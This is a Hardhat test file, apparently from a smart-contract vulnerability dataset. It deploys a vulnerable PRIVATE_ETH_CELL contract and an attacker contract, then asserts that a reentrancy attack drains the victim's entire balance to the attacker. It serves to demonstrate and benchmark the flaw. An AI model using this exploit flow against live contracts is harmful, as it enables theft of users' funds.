const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol", function () {
  let PrivateETHCell;
  let privateETHCell;
  let MaliciousContract;
  let maliciousContract;
  let LogFile;
  let logFile;

  beforeEach(async function () {
    // Deploy LogFile contract
    LogFile = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:LogFile");
    logFile = await LogFile.deploy();
    await logFile.waitForDeployment();

    // Deploy PrivateETHCell contract with LogFile address
    PrivateETHCell = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:PRIVATE_ETH_CELL");
    privateETHCell = await PrivateETHCell.deploy();
    await privateETHCell.waitForDeployment();
    await privateETHCell.SetLogFile(logFile.target); // Set LogFile address after deployment

    // Deploy MaliciousContract with PrivateETHCell address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106_attack.sol:MaliciousContract");
    maliciousContract = await MaliciousContract.deploy(privateETHCell.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to PrivateETHCell contract
    await privateETHCell.Deposit({ value: ethers.parseEther("5") });
    
    const initialBalance = await ethers.provider.getBalance(privateETHCell.target);
    expect(initialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousCOntract on Personal Bank
    await maliciousContract.deposit({value:  ethers.parseEther("2")});

    const privateBalanceAfterMalDeposit = await ethers.provider.getBalance(privateETHCell.target);
    expect(privateBalanceAfterMalDeposit).to.equal(ethers.parseEther("7")); 

    // Perform reentrancy attack through MaliciousContract
    await maliciousContract.attack({ value: ethers.parseEther("2") });

    // Verify the attack was successful

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(privateETHCell.target);
    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);
    
    // privateETHCell has a drained account
    expect(personalBankBalance).to.equal(ethers.parseEther("0")); 

    // 5 original balance + 2 from initial deposit +2 from attack (because victim contract fallback function deposits the attack money)
    expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
  });
});
